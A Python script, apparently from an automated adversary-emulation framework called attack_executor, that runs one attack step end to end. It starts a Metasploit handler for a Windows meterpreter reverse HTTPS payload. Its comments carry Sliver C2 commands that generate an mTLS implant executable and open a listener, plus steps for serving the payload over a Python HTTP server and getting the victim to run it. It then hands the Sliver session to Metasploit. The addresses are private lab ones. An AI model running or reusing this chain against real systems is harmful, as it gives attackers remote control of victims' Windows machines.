import asyncio


async def main():
    from attack_executor.config import load_config

    config = load_config(config_file_path="/home/user/attack_executor/test/config.ini")

    from attack_executor.exploit.Metasploit import MetasploitExecutor
    metasploit_executor = MetasploitExecutor(config = config)
    metasploit_executor.exploit_and_execute_payload(
                                target = None,
                                exploit_module_name = "exploit/multi/handler",
                                payload_module_name = "windows/x64/meterpreter_reverse_https",
                                listening_host = "192.168.56.39",
                                listening_port = "8443")

    """
    Executor:
    Sliver Console
    Command:
    sliver > generate --mtls 192.168.56.39:9001 --os windows --arch 64bit --format exe --save /home/user/Downloads
    sliver > mtls --lport 9001

    """

    """
    Executor:
    Human
    Command:
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server

    (On victim's machine)
    1. Open #{LHOST}:#{LPORT} in the browser
    2. Navigate to the path of the target payload file
    3. Download the payload file
    4. Executet the payload file to #{PATH}

    """

    """
    Executor:
    None
    Command:
    None

    """

    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config = config)
    await sliver_executor.msf("ef0df1a6-8a75-4343-a202-f4ae61a82c11", "meterpreter_reverse_https", "192.168.56.39", 8443)


if __name__ == '__main__':
    asyncio.run(main())